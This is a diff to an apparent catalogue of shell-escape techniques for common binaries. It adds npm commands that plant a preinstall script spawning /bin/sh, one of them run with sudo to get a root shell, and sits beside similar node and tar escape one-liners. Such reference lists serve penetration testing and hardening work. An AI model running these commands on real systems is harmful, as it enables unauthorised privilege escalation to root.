@@ -112,6 +112,11 @@
     - {func: shell, code: "node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"}
     - {func: sudo, code: "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"}
 
+- bin: npm
+  functions:
+    - {func: sudo, code: "TF=$(mktemp -d); echo '{\"scripts\":{\"preinstall\":\"/bin/sh -c \\\"exec /bin/sh\\\"\"}}' > $TF/package.json; sudo npm -C $TF --unsafe-perm i  # sudo npm i runs the package.json preinstall script as root"}
+    - {func: shell, code: "TF=$(mktemp -d); echo '{\"scripts\":{\"preinstall\":\"/bin/sh\"}}' > $TF/package.json; npm -C $TF --unsafe-perm i"}
+
 - bin: tar
   functions:
     - {func: shell, code: "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'"}
